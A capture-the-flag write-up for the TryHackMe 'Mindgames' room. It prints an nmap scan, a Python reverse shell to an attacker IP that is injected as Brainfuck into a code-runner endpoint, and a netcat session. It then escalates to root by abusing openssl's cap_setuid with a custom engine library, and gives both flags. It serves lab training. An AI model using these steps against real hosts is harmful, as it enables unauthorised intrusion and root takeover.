# Mindgames

Just a terrible idea...

[Mindgames](https://tryhackme.com/room/mindgames)

## Topic's

- Network Enumeration
- Web Poking
- Code Injection (RCE)
- Capabilities

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Capture the flags

No hints. Hack it. Don't give up if you get stuck, enumerate harder

```
kali@kali:~/CTFs/tryhackme/Mindgames$ sudo nmap -A -sS -sC -sV --script vuln 10.10.69.233
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 10:45 CEST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.69.233
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners:
|   cpe:/a:openbsd:openssh:7.6p1:
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter:
|
|_    Couldn't find a file-type field.
|_http-passwd: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=33922%PV=Y%DS=2%DC=T%G=Y%TM=5F856B
OS:59%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=2%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   36.05 ms 10.8.0.1
2   36.23 ms 10.10.69.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 573.71 seconds
```

[http://10.10.69.233/](http://10.10.69.233/)

[view-source:http://10.10.69.233/main.js](view-source:http://10.10.69.233/main.js)

```js
async function postData(url = "", data = "") {
  // Default options are marked with *
  const response = await fetch(url, {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "same-origin", // include, *same-origin, omit
    headers: {
      "Content-Type": "text/plain",
    },
    redirect: "follow", // manual, *follow, error
    referrerPolicy: "no-referrer", // no-referrer, *client
    body: data, // body data type must match "Content-Type" header
  });
  return response; // We don't always want JSON back
}
function onLoad() {
  document
    .querySelector("#codeForm")
    .addEventListener("submit", function (event) {
      event.preventDefault();
      runCode();
    });
}
async function runCode() {
  const programBox = document.querySelector("#code");
  const outBox = document.querySelector("#outputBox");
  outBox.textContent = await (
    await postData("/api/bf", programBox.value)
  ).text();
}
```

```py
import os
os.system('bash -c "bash -i >& /dev/tcp/10.8.106.222/9001 0>&1"')
```

[Create a Brainfuck code that outputs a given text](https://copy.sh/brainfuck/text.html)

```
+[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.+++++[->+++<]>.++++.>++++++++++.-[------->+<]>.++++.+[++>---<]>.[--->++<]>-.++++++.------.+.+++[->+++<]>.++++++++.+++[++>---<]>.-.-[--->+<]>.-.--[--->+<]>--.-----------.--[--->+<]>--.--[-->+++<]>.-[--->+<]>-.[--->+<]>-.++.-[->+++<]>-.-.--[--->+<]>--.-----------.--[--->+<]>--.--[-->+++<]>.[--->+++++++<]>.[--->+<]>---.-[->++<]>.--[--->++<]>--.------.[-->+++<]>-.[--->+<]>-.+.[--->+<]>-.[++>---<]>--.-[--->++<]>.++[->+++<]>+.+++++++++++++.[->+++++<]>-.++.-.--.++++++++++.----------.+++.-.++++++.--------.++++...---.++++++++++.---------..+.-[--->++<]>.[-->+++<]>.+[----->+<]>+.--[--->++<]>--.+++++++++++.++[--->++<]>.+++++.++.
```

```
kali@kali:~/CTFs/tryhackme/Mindgames$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.69.233] 37224
bash: cannot set terminal process group (678): Inappropriate ioctl for device
bash: no job control in this shell
mindgames@mindgames:~/webserver$ whoami
whoami
mindgames
mindgames@mindgames:~/webserver$ ls -la
ls -la
total 7032
drwxrwxr-x 3 mindgames mindgames    4096 May 11 15:36 .
drwxr-xr-x 6 mindgames mindgames    4096 May 11 15:36 ..
drwxrwxr-x 2 mindgames mindgames    4096 May 11 15:29 resources
-rwxrwxr-x 1 mindgames mindgames 7188315 May 11 15:31 server
mindgames@mindgames:~/webserver$ cd
cd
mindgames@mindgames:~$ ls -la
ls -la
total 40
drwxr-xr-x 6 mindgames mindgames 4096 May 11 15:36 .
drwxr-xr-x 4 root      root      4096 May 11 13:48 ..
lrwxrwxrwx 1 mindgames mindgames    9 May 11 15:25 .bash_history -> /dev/null
-rw-r--r-- 1 mindgames mindgames  220 May 11 13:48 .bash_logout
-rw-r--r-- 1 mindgames mindgames 3771 May 11 13:48 .bashrc
drwx------ 2 mindgames mindgames 4096 May 11 14:07 .cache
drwx------ 3 mindgames mindgames 4096 May 11 14:07 .gnupg
drwxrwxr-x 3 mindgames mindgames 4096 May 11 15:24 .local
-rw-r--r-- 1 mindgames mindgames  807 May 11 13:48 .profile
-rw-rw-r-- 1 mindgames mindgames   38 May 11 15:24 user.txt
drwxrwxr-x 3 mindgames mindgames 4096 May 11 15:36 webserver
mindgames@mindgames:~$ cat user.txt
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}
```

```
mindgames@mindgames:~/webserver$ getcap -r / 2> /dev/null
getcap -r / 2> /dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```

[https://gtfobins.github.io/gtfobins/openssl/#sudo](https://gtfobins.github.io/gtfobins/openssl/#sudo)

[https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/)

```
kali@kali:~/CTFs/tryhackme/Mindgames$ gcc -fPIC -o rootshell.o -c rootshell.c
kali@kali:~/CTFs/tryhackme/Mindgames$ gcc -shared -o rootshell.so -lcrypto rootshell.o
kali@kali:~/CTFs/tryhackme/Mindgames$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.69.233 - - [13/Oct/2020 11:03:58] "GET /rootshell.so HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
kali@kali:~/CTFs/tryhackme/Mindgames$
```

```
mindgames@mindgames:~/webserver$ chmod +x rootshell.so
chmod +x rootshell.so
mindgames@mindgames:~/webserver$ openssl req -engine ./rootshell.so
openssl req -engine ./rootshell.so
whoami
root
cd /root
ls
root.txt
cat root.txt
thm{1974a617cc84c5b51411c283544ee254}
```

1. User flag.

`thm{411f7d38247ff441ce4e134b459b6268}`

2. Root flag.

`thm{1974a617cc84c5b51411c283544ee254}`
